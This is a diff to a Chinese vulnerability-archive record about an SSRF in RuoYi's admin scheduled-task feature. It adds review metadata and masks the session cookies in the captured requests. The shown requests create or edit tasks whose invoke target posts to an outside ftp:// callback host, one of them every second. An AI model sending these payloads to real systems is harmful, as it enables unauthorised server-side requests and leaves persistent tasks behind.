@@ -1,6 +1,40 @@
 ---
 source: "gelusus/wxvl 公众号漏洞文库"
+product: "RuoYi/任务调用目标限制"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+title: "SpringKill的0day若依后台定时任务存在SSRF漏洞"
+prerequisites: "来源所述条件，未列明部分仍待核：只master源码链接，未锁RuoYi/JDK版本；需任务创建/编辑/执行权限"
+side_effects: "未执行；本文需注意的操作影响：PoC含第三方回调和持续任务；固定ipv6.1433.eu.org及JSESSIONID，cron0/1与status0可能持续触发，没有停用/删除"
+source_status: "unknown"
+id: "vw-ef4328aadd6009e2a9886996"
+entity_id: "ve-ef4328aadd6009e2a9886996"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：只master源码链接，未锁RuoYi/JDK版本；需任务创建/编辑/执行权限
+
+代码与实验材料：HttpUtils.sendPost FTP参数和两任务请求，DNS回调只证明解析不证明完整FTP/HTTP交互；每秒定时任务有持续副作用
+
+来源证据范围：SpringKill署名和项目master，未给漏洞公告
+
+- **适用与权限边界（1）**：权限、回调性质及版本不完整；依据：后台任务能力不等于未认证SSRF；只有DNS图不能判断请求成功或内网内容可读。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
+
+- **操作与副作用边界（2）**：PoC含第三方回调和持续任务；依据：固定ipv6.1433.eu.org及JSESSIONID，cron0/1与status0可能持续触发，没有停用/删除。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 #  SpringKill的0day|若依后台定时任务存在SSRF漏洞   
 原创 春纱  卫界安全-阿呆攻防   2024-04-20 15:21  
@@ -78,7 +112,7 @@ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
 sec-ch-ua-mobile: ?0
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
-Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4
+Cookie: JSESSIONID=563******************************ea4
 
 jobId=102&updateBy=admin&jobName=test&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp%3A%2F%2F6a928e83f9.ipv6.1433.eu.org'%2C'')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=1&remark=
 ```  
@@ -93,7 +127,7 @@ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
 sec-ch-ua-mobile: ?0
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
-Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4
+Cookie: JSESSIONID=563******************************ea4
 
 
 createBy=admin&jobName=test1&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp%3A%2F%2F6a928e83f9.ipv6.1433.eu.org'%2C'')&cronExpression=0%2F1+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
